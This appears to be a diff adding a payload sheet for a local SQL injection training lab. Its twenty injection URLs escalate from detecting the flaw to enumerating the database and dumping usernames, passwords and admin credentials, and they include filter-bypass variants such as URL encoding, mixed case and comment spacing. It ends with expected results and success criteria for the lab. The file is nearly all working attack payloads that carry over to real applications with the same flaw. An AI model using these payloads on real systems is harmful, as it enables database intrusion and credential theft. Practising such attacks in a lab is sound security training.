@@ -1,0 +1,106 @@
+# Lab 4: SQL Injection UNION Attack - Test Payloads
+
+## Basic SQL Injection Tests
+
+1. Test for SQL injection presence:
+   http://localhost/lab4/index.php?category=Electronics'
+
+2. Test with comment:
+   http://localhost/lab4/index.php?category=Electronics'--
+
+## Determine Column Count
+
+3. ORDER BY technique:
+   http://localhost/lab4/index.php?category=Electronics' ORDER BY 1--
+   http://localhost/lab4/index.php?category=Electronics' ORDER BY 2--
+   http://localhost/lab4/index.php?category=Electronics' ORDER BY 3--
+   http://localhost/lab4/index.php?category=Electronics' ORDER BY 4--
+   (Error at 4 confirms 3 columns)
+
+## UNION Injection Tests
+
+4. Test UNION compatibility:
+   http://localhost/lab4/index.php?category=Electronics' UNION SELECT 'test1','test2','test3'--
+
+5. Test with NULL values:
+   http://localhost/lab4/index.php?category=Electronics' UNION SELECT NULL,NULL,NULL--
+
+## Information Gathering
+
+6. Get database version:
+   http://localhost/lab4/index.php?category=Electronics' UNION SELECT @@version,'',''--
+
+7. Get current database name:
+   http://localhost/lab4/index.php?category=Electronics' UNION SELECT database(),'',''--
+
+8. Get current user:
+   http://localhost/lab4/index.php?category=Electronics' UNION SELECT user(),'',''--
+
+## Database Enumeration
+
+9. List all tables:
+   http://localhost/lab4/index.php?category=Electronics' UNION SELECT table_name,'','tables' FROM information_schema.tables WHERE table_schema=database()--
+
+10. Get columns from users table:
+    http://localhost/lab4/index.php?category=Electronics' UNION SELECT column_name,'','users_cols' FROM information_schema.columns WHERE table_name='users'--
+
+## Data Extraction
+
+11. Extract usernames only:
+    http://localhost/lab4/index.php?category=Electronics' UNION SELECT username,'','user_data' FROM users--
+
+12. Extract passwords only:
+    http://localhost/lab4/index.php?category=Electronics' UNION SELECT password,'','pass_data' FROM users--
+
+13. Extract both username and password (MAIN TARGET):
+    http://localhost/lab4/index.php?category=Electronics' UNION SELECT username,password,'credential' FROM users--
+
+14. Extract admin user specifically:
+    http://localhost/lab4/index.php?category=Electronics' UNION SELECT username,password,'admin_cred' FROM users WHERE role='admin'--
+
+15. Extract all user details:
+    http://localhost/lab4/index.php?category=Electronics' UNION SELECT CONCAT(username,':',password,':',role),'','all_users' FROM users--
+
+## Alternative Payload Formats
+
+16. Using + instead of spaces:
+    http://localhost/lab4/index.php?category=Electronics'+UNION+SELECT+username,password,'credential'+FROM+users--
+
+17. Using /**/ comments:
+    http://localhost/lab4/index.php?category=Electronics'/**/UNION/**/SELECT/**/username,password,'credential'/**/FROM/**/users--
+
+18. Using URL encoding:
+    http://localhost/lab4/index.php?category=Electronics%27%20UNION%20SELECT%20username%2Cpassword%2C%27credential%27%20FROM%20users--
+
+## Advanced Techniques
+
+19. Bypass potential filters with case variation:
+    http://localhost/lab4/index.php?category=Electronics' uNiOn SeLeCt username,password,'credential' fRoM users--
+
+20. Using LIMIT to get specific records:
+    http://localhost/lab4/index.php?category=Electronics' UNION SELECT username,password,'credential' FROM users LIMIT 1,1--
+
+## Expected Results
+
+When payload #13 works correctly, you should see:
+- Regular product listings
+- Additional "products" that are actually user credentials:
+  * administrator | admin123!@# | credential
+  * john_doe | password123 | credential
+  * jane_smith | mypassword | credential
+  * etc.
+
+## Success Criteria
+
+✓ Successfully extract admin username: administrator
+✓ Successfully extract admin password: admin123!@#
+✓ Login at http://localhost/lab4/login.php using discovered credentials
+✓ Gain administrative access to complete the lab
+
+## Notes
+
+- All payloads assume the vulnerable parameter is 'category'
+- The application returns 3 columns: name, description, price
+- Target database contains 'users' table with sensitive credentials
+- Administrator account has highest privileges
+- URL encode payloads if necessary for browser compatibility
